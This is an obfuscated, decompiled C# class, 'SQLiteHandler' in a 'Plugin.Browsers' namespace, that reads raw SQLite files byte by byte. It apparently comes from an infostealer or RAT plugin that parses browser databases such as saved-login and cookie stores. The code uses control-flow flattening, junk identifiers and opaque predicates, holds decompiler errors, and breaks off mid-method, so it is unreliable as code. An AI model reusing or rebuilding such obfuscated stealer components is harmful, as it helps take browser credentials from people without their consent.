using System;
using System.Runtime.CompilerServices;
using HsZcU78F13T1yLWI1V;
using Microsoft.VisualBasic;
using UY3BiEArlp6B4GPt9k;

namespace Plugin.Browsers;

public class SQLiteHandler
{
	private struct record_header_field
	{
		public long size;

		public long type;
	}

	private struct sqlite_master_entry
	{
		public long row_id;

		public string item_type;

		public string item_name;

		public long root_num;

		public string sql_statement;
	}

	private struct table_entry
	{
		public long row_id;

		public string[] content;
	}

	private byte[] db_bytes;

	private ulong encoding;

	private string[] field_names;

	private sqlite_master_entry[] master_table_entries;

	private ushort page_size;

	private byte[] SQLDataTypeSize;

	private table_entry[] table_entries;

	internal static SQLiteHandler q8VRdKb3PhVpjY4HSq3;

	[MethodImpl(MethodImplOptions.NoInlining)]
	public SQLiteHandler(string baseName)
	{
		aai2m2bvsPTVJdFA9oD();
		byte[] array = new byte[10];
		CWyhFSbNEOl6fSofOgq(array, (RuntimeFieldHandle)/*OpCode not supported: LdMemberToken*/, XoIOgKkSI6jhAYrCFN.PKB1Wruqx);
		SQLDataTypeSize = array;
		base._002Ector();
		int num = 12;
		string text = default(string);
		int num2 = default(int);
		while (true)
		{
			switch (num)
			{
			case 13:
				return;
			case 2:
				db_bytes = (byte[])mXvEI7bAKrd4XyyRRHa(epSgjwbRDiZUV0MnyRq(gRnjGrxKdWbynd12Ef3.N4xxQnl35W), text, lvfeUdxdotHleo5TGFR.x5Wxq1S9FF);
				num = 6;
				break;
			case 8:
				if (AJYBHdbVtlSNnFpHQ8B(new decimal(encoding), 0m, D7od3ix85e95ZRovJXE.F29xlMZGHq) == 0)
				{
					num = 1;
					if (0 == 0)
					{
						break;
					}
					goto IL_0041;
				}
				goto case 10;
			case 11:
				text = (string)vC6KcQbhEEeghGcnxnu((int)NICvSpbcwwpNMefs74E(1, le9HJ9F7jJ5n0a4FnF.AT3nOxy7J), kq7JeXpFcRxmKRKDEy.fZQzB5Gca);
				num = 7;
				break;
			case 1:
				encoding = 1uL;
				num = 10;
				if (false)
				{
					num = 4;
				}
				break;
			case 14:
				return;
			case 9:
				BXP8Npb9cW0mtedRJg1(1, baseName, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared, -1, DtIWNuicSgojV5Jdc4.LIgywgeKK);
				num2 = 11;
				goto IL_0041;
			case 10:
				ReadMasterTable(100uL);
				num = 14;
				break;
			case 4:
				encoding = ConvertToInteger(56, 4);
				num = 8;
				break;
			case 15:
				throw new Exception((string)QR0eAdbOpPv7iXihK01(238));
			case 7:
				KjJpc0xtqML0jyoxww0.IrTxr5idK(1, ref text, -1L, false, KjJpc0xtqML0jyoxww0.RLIxxGgLxI);
				num = 0;
				if (true)
				{
					break;
				}
				goto IL_0041;
			default:
				LieU7Bxcy62ItMjeWlL.IrTxr5idK(new int[1] { 1 }, LieU7Bxcy62ItMjeWlL.uKlxHxQvaP);
				num2 = 2;
				goto IL_0041;
			case 6:
				if (SkAFZqbXhxNaQ388ACd(eYy7jFbTFrUwy7adJeD(epSgjwbRDiZUV0MnyRq(gRnjGrxKdWbynd12Ef3.N4xxQnl35W), db_bytes, 0, 15, EpL402xDMFadHMekcdj.HI6xWLaayN), QR0eAdbOpPv7iXihK01(132), AsQwq3xgUvOgJMthJeb.DDLxGNbNT5) == 0)
				{
					num = 3;
					break;
				}
				goto case 5;
			case 12:
				if (!vMAL22bq65LRX6rnvXK(baseName, fiM4Hw9Fl6DhXSwmaZ.Jh8VdS1qN))
				{
					num = 13;
					break;
				}
				goto case 9;
			case 5:
				throw new Exception((string)QR0eAdbOpPv7iXihK01(166));
			case 3:
				{
					if (db_bytes[52] == 0)
					{
						page_size = (ushort)ConvertToInteger(16, 2);
						num = 4;
						break;
					}
					num = 5;
					if (true)
					{
						num = 15;
					}
					break;
				}
				IL_0041:
				num = num2;
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private ulong ConvertToInteger(int startIndex, int Size)
	{
		int num = 6;
		ulong num3 = default(ulong);
		int num4 = default(int);
		int num5 = default(int);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 3:
				case 4:
					num3 = (num3 << 8) | db_bytes[startIndex + num4];
					num2 = 10;
					if (vEqCHrbfSFZEkZtgXxf())
					{
						continue;
					}
					break;
				case 7:
					num5 = Size - 1;
					num2 = 9;
					continue;
				case 1:
					return 0uL;
				case 5:
					num3 = 0uL;
					num2 = 3;
					if (yFobEtbomKkYXt6dhK5() == null)
					{
						num2 = 7;
					}
					continue;
				case 10:
					num4++;
					num2 = 0;
					if (vEqCHrbfSFZEkZtgXxf())
					{
						continue;
					}
					break;
				case 9:
					num4 = 0;
					num2 = 2;
					if (vEqCHrbfSFZEkZtgXxf())
					{
						continue;
					}
					break;
				default:
					if (num4 <= num5)
					{
						num2 = 4;
						if (vEqCHrbfSFZEkZtgXxf())
						{
							num2 = 4;
						}
						continue;
					}
					goto case 8;
				case 6:
					if (!(Size > 8 || Size == 0))
					{
						num2 = 0;
						if (vEqCHrbfSFZEkZtgXxf())
						{
							num2 = 5;
						}
						continue;
					}
					goto case 1;
				case 8:
					return num3;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private long CVL(int startIndex, int endIndex)
	{
		int num = 25;
		int num4 = default(int);
		int num5 = default(int);
		int num6 = default(int);
		int num3 = default(int);
		bool flag = default(bool);
		byte[] array = default(byte[]);
		int num7 = default(int);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				default:
					if (num4 < startIndex)
					{
						num2 = 4;
						if (vEqCHrbfSFZEkZtgXxf())
						{
							continue;
						}
						break;
					}
					goto case 21;
				case 29:
					return 0L;
				case 28:
					num5 = 7;
					num2 = 14;
					if (yFobEtbomKkYXt6dhK5() == null)
					{
						continue;
					}
					break;
				case 7:
					num6++;
					num2 = 12;
					continue;
				case 11:
					num3 = 1;
					num2 = 23;
					continue;
				case 15:
					if (!flag)
					{
						num2 = 18;
						if (yFobEtbomKkYXt6dhK5() == null)
						{
							continue;
						}
						break;
					}
					goto case 6;
				case 14:
					num3 = 0;
					num = 15;
					break;
				case 25:
					endIndex++;
					num2 = 24;
					continue;
				case 18:
				case 23:
					num4 = endIndex - 1;
					num2 = 0;
					if (yFobEtbomKkYXt6dhK5() != null)
					{
						num2 = 0;
					}
					continue;
				case 17:
					array[0] = (byte)(db_bytes[startIndex] & 0x7F);
					num2 = 2;
					continue;
				case 10:
					num7 = endIndex - startIndex;
					num2 = 31;
					if (vEqCHrbfSFZEkZtgXxf())
					{
						continue;
					}
					break;
				case 20:
					if (!(num7 == 0 || num7 > 9))
					{
						switch (num7)
						{
						case 1:
							num2 = 5;
							if (vEqCHrbfSFZEkZtgXxf())
							{
								num2 = 17;
							}
							continue;
						case 9:
							num2 = 13;
							continue;
						}
						goto case 27;
					}
					num2 = 29;
					continue;
				case 24:
					array = new byte[8];
					num2 = 10;
					if (vEqCHrbfSFZEkZtgXxf())
					{
						continue;
					}
					break;
				case 1:
				case 22:
					if (flag)
					{
						num = 26;
						break;
					}
					goto case 3;
				case 13:
					flag = true;
					num2 = 27;
					continue;
				case 8:
					endIndex--;
					num2 = 11;
					if (yFobEtbomKkYXt6dhK5() != null)
					{
						num2 = 5;
					}
					continue;
				case 16:
					num5--;
					num2 = 9;
					continue;
				case 3:
					array[num3] = (byte)((byte)(db_bytes[num4] >> ((num6 - 1) & 7)) & (255 >> num6));
					num2 = 5;
					continue;
				case 5:
				case 9:
				case 26:
					num4 += -1;
					num2 = 30;
					continue;
				case 2:
					return pOBTtxb1TRowlInigCS(array, 0, hfP5Dgx7pUVx5KZGt5k.DENxJG6bEj);
				case 27:
					num6 = 1;
					num = 28;
					break;
				case 6:
					array[0] = db_bytes[endIndex - 1];
					num2 = 8;
					continue;
				case 12:
					num3++;
					num2 = 16;
					if (vEqCHrbfSFZEkZtgXxf())
					{
						continue;
					}
					break;
				case 19:
					array[num3] = (byte)(((byte)(db_bytes[num4] >> ((num6 - 1) & 7)) & (255 >> num6)) | (byte)(db_bytes[num4 - 1] << (num5 & 7)));
					num2 = 7;
					continue;
				case 4:
					return pOBTtxb1TRowlInigCS(array, 0, hfP5Dgx7pUVx5KZGt5k.DENxJG6bEj);
				case 21:
					if (num4 - 1 < startIndex)
					{
						num2 = 1;
						if (vEqCHrbfSFZEkZtgXxf())
						{
							continue;
						}
						break;
					}
					goto case 19;
				case 31:
					flag = false;
					num2 = 20;
					continue;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public int GetRowCount()
	{
		return table_entries.Length;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public string[] GetTableNames()
	{
		int num = 8;
		int num5 = default(int);
		int num3 = default(int);
		string[] array = default(string[]);
		int num4 = default(int);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 5:
					num5 = 0;
					num2 = 4;
					continue;
				case 1:
				case 4:
					if (num5 > num3)
					{
						num2 = 3;
						continue;
					}
					goto case 9;
				default:
					array[num4] = master_table_entries[num5].item_name;
					num = 6;
					break;
				case 6:
					num4++;
					num2 = 2;
					continue;
				case 8:
					array = null;
					num2 = 7;
					if (vEqCHrbfSFZEkZtgXxf())
					{
						continue;
					}
					break;
				case 10:
					array = (string[])eIcUWabUpMfqxVTuxeb(array, new string[num4 + 1], pCGlJFxrX5h4bahtbTH.PPpxvDa7Te);
					num2 = 0;
					if (vEqCHrbfSFZEkZtgXxf())
					{
						continue;
					}
					break;
				case 9:
					if (mCmfdtbwUdFu2tKJUZe(master_table_entries[num5].item_type, QR0eAdbOpPv7iXihK01(332), xaHR5Px3RNdNB4LsQbl.zaGxaKrUPr))
					{
						num2 = 10;
						if (vEqCHrbfSFZEkZtgXxf())
						{
							continue;
						}
						break;
					}
					goto case 2;
				case 7:
					num4 = 0;
					num = 11;
					break;
				case 2:
					num5++;
					num2 = 1;
					if (yFobEtbomKkYXt6dhK5() != null)
					{
						num2 = 0;
					}
					continue;
				case 11:
					num3 = master_table_entries.Length - 1;
					num2 = 5;
					continue;
				case 3:
					return array;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public string GetValue(int row_num, int field)
	{
		int num = 2;
		int num2 = num;
		while (true)
		{
			switch (num2)
			{
			case 3:
				return null;
			case 1:
				if (field < table_entries[row_num].content.Length)
				{
					num2 = 4;
					break;
				}
				goto default;
			default:
				return null;
			case 4:
				return table_entries[row_num].content[field];
			case 2:
				if (row_num < table_entries.Length)
				{
					num2 = 1;
					if (yFobEtbomKkYXt6dhK5() != null)
					{
						num2 = 1;
					}
					break;
				}
				goto case 3;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public string GetValue(int row_num, string field)
	{
		int num = 1;
		int num5 = default(int);
		int num4 = default(int);
		int num3 = default(int);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 6:
					return null;
				case 8:
				case 9:
					if (num5 != -1)
					{
						return GetValue(row_num, num5);
					}
					num2 = 6;
					if (yFobEtbomKkYXt6dhK5() != null)
					{
						num2 = 2;
					}
					continue;
				default:
					num4 = field_names.Length - 1;
					num2 = 0;
					if (yFobEtbomKkYXt6dhK5() == null)
					{
						num2 = 5;
					}
					continue;
				case 1:
					num5 = -1;
					num2 = 0;
					if (!vEqCHrbfSFZEkZtgXxf())
					{
						num2 = 0;
					}
					continue;
				case 4:
					num5 = num3;
					num2 = 8;
					if (yFobEtbomKkYXt6dhK5() == null)
					{
						continue;
					}
					break;
				case 7:
				case 10:
					if (AsQwq3xgUvOgJMthJeb.IrTxr5idK(K27ejBbpvKGrVPHYmG5(field_names[num3], JB4J6pqWfLbCbJXTau.XBZxERwu9B), (string)K27ejBbpvKGrVPHYmG5(field, JB4J6pqWfLbCbJXTau.XBZxERwu9B), AsQwq3xgUvOgJMthJeb.DDLxGNbNT5) == 0)
					{
						num = 4;
						break;
					}
					goto case 11;
				case 11:
					num3++;
					num2 = 3;
					if (yFobEtbomKkYXt6dhK5() == null)
					{
						continue;
					}
					break;
				case 5:
					num3 = 0;
					num2 = 2;
					if (yFobEtbomKkYXt6dhK5() == null)
					{
						continue;
					}
					break;
				case 2:
				case 3:
					if (num3 <= num4)
					{
						num = 7;
						break;
					}
					goto case 8;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private int GVL(int startIndex)
	{
		int num = 8;
		int num3 = default(int);
		int num4 = default(int);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 5:
					return 0;
				case 2:
				case 10:
					if (num3 <= db_bytes.Length - 1)
					{
						if ((db_bytes[num3] & 0x80) != 128)
						{
							num2 = 6;
							if (vEqCHrbfSFZEkZtgXxf())
							{
								continue;
							}
							break;
						}
						num3++;
						num2 = 2;
						if (vEqCHrbfSFZEkZtgXxf())
						{
							num2 = 4;
						}
						continue;
					}
					num2 = 5;
					continue;
				case 8:
					if (startIndex <= db_bytes.Length)
					{
						num2 = 7;
						continue;
					}
					goto case 9;
				case 6:
					return num3;
				case 3:
					return startIndex + 8;
				default:
					num3 = startIndex;
					num2 = 1;
					if (yFobEtbomKkYXt6dhK5() == null)
					{
						num2 = 1;
					}
					continue;
				case 9:
					return 0;
				case 7:
					num4 = startIndex + 8;
					num2 = 0;
					if (yFobEtbomKkYXt6dhK5() == null)
					{
						continue;
					}
					break;
				case 1:
				case 4:
					if (num3 <= num4)
					{
						num2 = 2;
						continue;
					}
					goto case 3;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private bool IsOdd(long value)
	{
		return (value & 1) == 1;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void ReadMasterTable(ulong Offset)
	{
		int num = 45;
		long value = default(long);
		ulong num6 = default(ulong);
		int num11 = default(int);
		long[] array = default(long[]);
		int num7 = default(int);
		int num10 = default(int);
		int num12 = default(int);
		ushort num3 = default(ushort);
		ushort num9 = default(ushort);
		int num8 = default(int);
		int num4 = default(int);
		int num5 = default(int);
		int num13 = default(int);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 6:
					value = CVL((int)num6, num11);
					num2 = 41;
					continue;
				case 67:
					num11 = GVL((int)num6);
					num2 = 27;
					if (vEqCHrbfSFZEkZtgXxf())
					{
						continue;
					}
					break;
				case 71:
					if (D7od3ix85e95ZRovJXE.IrTxr5idK(new decimal(encoding), 3m, D7od3ix85e95ZRovJXE.F29xlMZGHq) == 0)
					{
						num2 = 69;
						if (yFobEtbomKkYXt6dhK5() != null)
						{
							num2 = 7;
						}
						continue;
					}
					goto case 20;
				case 52:
				case 72:
					if (AJYBHdbVtlSNnFpHQ8B(new decimal(encoding), 3m, D7od3ix85e95ZRovJXE.F29xlMZGHq) != 0)
					{
						num2 = 30;
						if (vEqCHrbfSFZEkZtgXxf())
						{
							continue;
						}
						break;
					}
					goto case 65;
				case 9:
					if (AJYBHdbVtlSNnFpHQ8B(new decimal(Offset), 100m, D7od3ix85e95ZRovJXE.F29xlMZGHq) == 0)
					{
						num2 = 75;
						if (yFobEtbomKkYXt6dhK5() == null)
						{
							continue;
						}
						break;
					}
					goto case 49;
				case 7:
					array[num7] = CVL(num11, num10);
					num2 = 39;
					continue;
				default:
					if (D7od3ix85e95ZRovJXE.IrTxr5idK(new decimal(encoding), 1m, D7od3ix85e95ZRovJXE.F29xlMZGHq) == 0)
					{
						num = 43;
						break;
					}
					goto case 22;
				case 26:
				case 74:
				case 80:
					num7++;
					num2 = 70;
					continue;
				case 1:
					if (AJYBHdbVtlSNnFpHQ8B(new decimal(Offset), 100m, D7od3ix85e95ZRovJXE.F29xlMZGHq) != 0)
					{
						num2 = 76;
						continue;
					}
					goto case 81;
				case 19:
				case 64:
					num12 = num3;
					num2 = 68;
					if (vEqCHrbfSFZEkZtgXxf())
					{
						continue;
					}
					break;
				case 62:
					num9 = (ushort)ConvertToInteger(dR7tgcbjSoo1sThVrXZ(oyoItnb8Cx91aw3oy3V(oyoItnb8Cx91aw3oy3V(new decimal(Offset), 12m, pJoaVHxY2BrIpClas5J.M5bxRIPnoW), new decimal(num8 * 2), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), ynfu4Xx2a098iYIc2kQ.OV7xMg5XLP), 2);
					num2 = 9;
					continue;
				case 40:
					master_table_entries[num4 + num5].sql_statement = (string)eYy7jFbTFrUwy7adJeD(epSgjwbRDiZUV0MnyRq(gRnjGrxKdWbynd12Ef3.WIcxbkC0Bn), db_bytes, dR7tgcbjSoo1sThVrXZ(oyoItnb8Cx91aw3oy3V(pJoaVHxY2BrIpClas5J.IrTxr5idK(oyoItnb8Cx91aw3oy3V(oyoItnb8Cx91aw3oy3V(oyoItnb8Cx91aw3oy3V(new decimal(num6), new decimal(value), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), new decimal(array[0]), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), new decimal(array[1]), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), new decimal(array[2]), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), new decimal(array[3]), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), ynfu4Xx2a098iYIc2kQ.OV7xMg5XLP), (int)array[4], EpL402xDMFadHMekcdj.HI6xWLaayN);
					num2 = 20;
					continue;
				case 12:
					master_table_entries = (sqlite_master_entry[])eIcUWabUpMfqxVTuxeb(master_table_entries, new sqlite_master_entry[master_table_entries.Length + num3 + 1], pCGlJFxrX5h4bahtbTH.PPpxvDa7Te);
					num2 = 35;
					if (vEqCHrbfSFZEkZtgXxf())
					{
						num2 = 64;
					}
					continue;
				case 25:
				case 47:
					if (AJYBHdbVtlSNnFpHQ8B(new decimal(encoding), 2m, D7od3ix85e95ZRovJXE.F29xlMZGHq) == 0)
					{
						num = 40;
						break;
					}
					goto case 71;
				case 23:
					master_table_entries[num4 + num5].sql_statement = (string)eYy7jFbTFrUwy7adJeD(epSgjwbRDiZUV0MnyRq(gRnjGrxKdWbynd12Ef3.N4xxQnl35W), db_bytes, dR7tgcbjSoo1sThVrXZ(oyoItnb8Cx91aw3oy3V(pJoaVHxY2BrIpClas5J.IrTxr5idK(oyoItnb8Cx91aw3oy3V(oyoItnb8Cx91aw3oy3V(pJoaVHxY2BrIpClas5J.IrTxr5idK(new decimal(num6), new decimal(value), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), new decimal(array[0]), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), new decimal(array[1]), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), new decimal(array[2]), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), new decimal(array[3]), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), ynfu4Xx2a098iYIc2kQ.OV7xMg5XLP), (int)array[4], EpL402xDMFadHMekcdj.HI6xWLaayN);
					num2 = 48;
					if (yFobEtbomKkYXt6dhK5() != null)
					{
						num2 = 36;
					}
					continue;
				case 41:
					array = new long[5];
					num2 = 17;
					continue;
				case 4:
				case 53:
					num8++;
					num = 24;
					break;
				case 20:
				case 48:
				case 57:
					num5++;
					num2 = 3;
					if (yFobEtbomKkYXt6dhK5() != null)
					{
						num2 = 0;
					}
					continue;
				case 54:
					return;
				case 60:
					num6 = cbDw8RxUyskuHYZv5kF.IrTxr5idK(oyoItnb8Cx91aw3oy3V(oyoItnb8Cx91aw3oy3V(new decimal(num6), oyoItnb8Cx91aw3oy3V(new decimal(num10), new decimal(num6), pJoaVHxY2BrIpClas5J.kNaxBtIDcG), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), 1m, pJoaVHxY2BrIpClas5J.M5bxRIPnoW), cbDw8RxUyskuHYZv5kF.BJKxudEbSe);
					num2 = 67;
					continue;
				case 58:
					master_table_entries[num4 + num5].item_type = (string)eYy7jFbTFrUwy7adJeD(gRnjGrxKdWbynd12Ef3.IrTxr5idK(gRnjGrxKdWbynd12Ef3.N4xxQnl35W), db_bytes, dR7tgcbjSoo1sThVrXZ(oyoItnb8Cx91aw3oy3V(new decimal(num6), new decimal(value), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), ynfu4Xx2a098iYIc2kQ.OV7xMg5XLP), (int)array[0], EpL402xDMFadHMekcdj.HI6xWLaayN);
					num2 = 0;
					if (yFobEtbomKkYXt6dhK5() != null)
					{
						num2 = 0;
					}
					continue;
				case 24:
				case 63:
					if (num8 > num13)
					{
						num2 = 55;
						continue;
					}
					goto case 62;
				case 73:
					num13 = IOHgf6x0ftNhqwwtsmQ.IrTxr5idK(oyoItnb8Cx91aw3oy3V(new decimal(ConvertToInteger(ynfu4Xx2a098iYIc2kQ.IrTxr5idK(oyoItnb8Cx91aw3oy3V(new decimal(Offset), 3m, pJoaVHxY2BrIpClas5J.M5bxRIPnoW), ynfu4Xx2a098iYIc2kQ.OV7xMg5XLP), 2)), 1m, pJoaVHxY2BrIpClas5J.kNaxBtIDcG), IOHgf6x0ftNhqwwtsmQ.p3txZPXrbV);
					num2 = 21;
					continue;
				case 59:
					if (AJYBHdbVtlSNnFpHQ8B(new decimal(encoding), 3m, D7od3ix85e95ZRovJXE.F29xlMZGHq) == 0)
					{
						num2 = 61;
						continue;
					}
					goto default;
				case 27:
					num10 = num11;
					num2 = 6;
					continue;
				case 14:
					CVL((int)num6, num11);
					num2 = 32;
					continue;
				case 69:
					master_table_entries[num4 + num5].sql_statement = (string)eYy7jFbTFrUwy7adJeD(gRnjGrxKdWbynd12Ef3.IrTxr5idK(gRnjGrxKdWbynd12Ef3.Y1HxNmjSpY), db_bytes, dR7tgcbjSoo1sThVrXZ(pJoaVHxY2BrIpClas5J.IrTxr5idK(oyoItnb8Cx91aw3oy3V(oyoItnb8Cx91aw3oy3V(oyoItnb8Cx91aw3oy3V(oyoItnb8Cx91aw3oy3V(new decimal(num6), new decimal(value), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), new decimal(array[0]), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), new decimal(array[1]), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), new decimal(array[2]), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), new decimal(array[3]), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), ynfu4Xx2a098iYIc2kQ.OV7xMg5XLP), (int)array[4], EpL402xDMFadHMekcdj.HI6xWLaayN);
					num2 = 57;
					continue;
				case 70:
					if (num7 <= 4)
					{
						num2 = 15;
						continue;
					}
					goto case 13;
				case 32:
					num10 = GVL(dR7tgcbjSoo1sThVrXZ(pJoaVHxY2BrIpClas5J.IrTxr5idK(oyoItnb8Cx91aw3oy3V(new decimal(num6), pJoaVHxY2BrIpClas5J.IrTxr5idK(new decimal(num11), new decimal(num6), pJoaVHxY2BrIpClas5J.kNaxBtIDcG), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), 1m, pJoaVHxY2BrIpClas5J.M5bxRIPnoW), ynfu4Xx2a098iYIc2kQ.OV7xMg5XLP));
					num2 = 10;
					if (yFobEtbomKkYXt6dhK5() == null)
					{
						num2 = 11;
					}
					continue;
				case 68:
					num5 = 0;
					num2 = 38;
					continue;
				case 77:
					num6 = ConvertToInteger(dR7tgcbjSoo1sThVrXZ(oyoItnb8Cx91aw3oy3V(oyoItnb8Cx91aw3oy3V(new decimal(Offset), 8m, pJoaVHxY2BrIpClas5J.M5bxRIPnoW), new decimal(num5 * 2), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), ynfu4Xx2a098iYIc2kQ.OV7xMg5XLP), 2);
					num2 = 1;
					if (vEqCHrbfSFZEkZtgXxf())
					{
						continue;
					}
					break;
				case 37:
					if (master_table_entries == null)
					{
						num2 = 10;
						if (yFobEtbomKkYXt6dhK5() != null)
						{
							num2 = 5;
						}
						continue;
					}
					goto case 78;
				case 22:
					if (D7od3ix85e95ZRovJXE.IrTxr5idK(new decimal(encoding), 2m, D7od3ix85e95ZRovJXE.F29xlMZGHq) != 0)
					{
						num2 = 72;
						continue;
					}
					goto case 5;
				case 43:
					master_table_entries[num4 + num5].item_name = EpL402xDMFadHMekcdj.IrTxr5idK(epSgjwbRDiZUV0MnyRq(gRnjGrxKdWbynd12Ef3.N4xxQnl35W), db_bytes, ynfu4Xx2a098iYIc2kQ.IrTxr5idK(oyoItnb8Cx91aw3oy3V(pJoaVHxY2BrIpClas5J.IrTxr5idK(new decimal(num6), new decimal(value), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), new decimal(array[0]), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), ynfu4Xx2a098iYIc2kQ.OV7xMg5XLP), (int)array[1], EpL402xDMFadHMekcdj.HI6xWLaayN);
					num2 = 16;
					if (!vEqCHrbfSFZEkZtgXxf())
					{
						num2 = 16;
					}
					continue;
				case 2:
					array[num7] = (long)ExIotwbl579mlAbNjfT((double)(array[num7] - 13) / 2.0, F8uQ4cxPXoMb3O4YCmO.j68xjGj3h1);
					num2 = 80;
					continue;
				case 16:
				case 18:
				case 28:
				case 30:
					master_table_entries[num4 + num5].root_num = (long)ConvertToInteger(dR7tgcbjSoo1sThVrXZ(oyoItnb8Cx91aw3oy3V(oyoItnb8Cx91aw3oy3V(oyoItnb8Cx91aw3oy3V(oyoItnb8Cx91aw3oy3V(new decimal(num6), new decimal(value), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), new decimal(array[0]), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), new decimal(array[1]), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), new decimal(array[2]), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), ynfu4Xx2a098iYIc2kQ.OV7xMg5XLP), (int)array[3]);
					num2 = 33;
					if (yFobEtbomKkYXt6dhK5() != null)
					{
						num2 = 32;
					}
					continue;
				case 61:
					master_table_entries[num4 + num5].item_type = (string)eYy7jFbTFrUwy7adJeD(epSgjwbRDiZUV0MnyRq(gRnjGrxKdWbynd12Ef3.Y1HxNmjSpY), db_bytes, dR7tgcbjSoo1sThVrXZ(oyoItnb8Cx91aw3oy3V(new decimal(num6), new decimal(value), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), ynfu4Xx2a098iYIc2kQ.OV7xMg5XLP), (int)array[0], EpL402xDMFadHMekcdj.HI6xWLaayN);
					num2 = 20;
					if (yFobEtbomKkYXt6dhK5() == null)
					{
						num2 = 31;
					}
					continue;
				case 39:
					if (array[num7] <= 9)
					{
						num2 = 8;
						continue;
					}
					goto case 46;
				case 81:
					num11 = GVL((int)num6);
					num2 = 14;
					continue;
				case 10:
				case 82:
					master_table_entries = new sqlite_master_entry[num3 + 1];
					num2 = 19;
					continue;
				case 79:
					return;
				case 5:
					master_table_entries[num4 + num5].item_name = (string)eYy7jFbTFrUwy7adJeD(epSgjwbRDiZUV0MnyRq(gRnjGrxKdWbynd12Ef3.WIcxbkC0Bn), db_bytes, dR7tgcbjSoo1sThVrXZ(oyoItnb8Cx91aw3oy3V(pJoaVHxY2BrIpClas5J.IrTxr5idK(new decimal(num6), new decimal(value), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), new decimal(array[0]), pJoaVHxY2BrIpClas5J.M5bxRIPnoW), ynfu4Xx2a098iYIc2kQ.OV7xMg5XLP), (int)array[1], EpL402xDMFadHMekcdj.HI6xWLaayN);
					num2 = 18;
					if (yFobEtbomKkYXt6dhK5() == null)
					{
						continue;
					}
					break;
				case 13:
					if (AJYBHdbVtlSNnFpHQ8B(new decimal(encoding), 1m, D7od3ix85e95ZRovJXE.F29xlMZGHq) == 0)
					{
						num2 = 58;
						continue;
					}
					goto case 56;
				case 17:
					num7 = 0;
					num2 = 42;
					continue;
				case 55:
					ReadMasterTable(oagAaDbkPBT1A4YW0Et(oyoItnb8Cx91aw3oy3V(oyoItnb8Cx91aw3oy3V(new decimal(ConvertToInteger(ynfu4Xx2a098iYIc2kQ.IrTxr5idK(oyoItnb8Cx91aw3oy3V(new decimal(Offset), 8m, pJoaVHxY2BrIpClas5J.M5bxRIPnoW), ynfu4Xx2a098iYIc2kQ.OV7xMg5XLP), 4)), 1m, pJoaVHxY2BrIpClas5J.kNaxBtIDcG), new decimal(page_size), pJoaVHxY2BrIpClas5J.EuGxwrqv5W), cbDw8RxUyskuHYZv5kF.BJKxudEbSe));
					num2 = 54;
					continue;
				case 15:
				case 42:
					num11 = num10 + 1;
					num2 = 35;
					continue;
				case 49:
					ReadMasterTable(cbDw8RxUyskuHYZv5kF.IrTxr5idK(oyoItnb8Cx91aw3oy3V(oyoItnb8Cx91aw3oy3V(new decimal(ConvertToInteger((int)(Offset + num9), 4)), 1m, pJoaVHxY2BrIpClas5J.kNaxBtIDcG), new decimal(page_size), pJoaVHxY2BrIpClas5J.EuGxwrqv5W), cbDw8RxUyskuHYZv5kF.BJKxudEbSe));
					num2 = 4;
					continue;
				case 8:
				case 34:
					array[num7] = SQLDataTypeSize[(int)array[num7]];
					num2 = 40;
					if (yFobEtbomKkYXt6dhK5() == null)
					{
						num2 = 74;
					}
					continue;
				case 3:
				case 38:
					if (num5 > num12)
					{
						num2 = 25;
						if (vEqCHrbfSFZEkZtgXxf())
						{
							num2 = 79;
						}
						continue;
					}
					goto case 77;
				case 11:
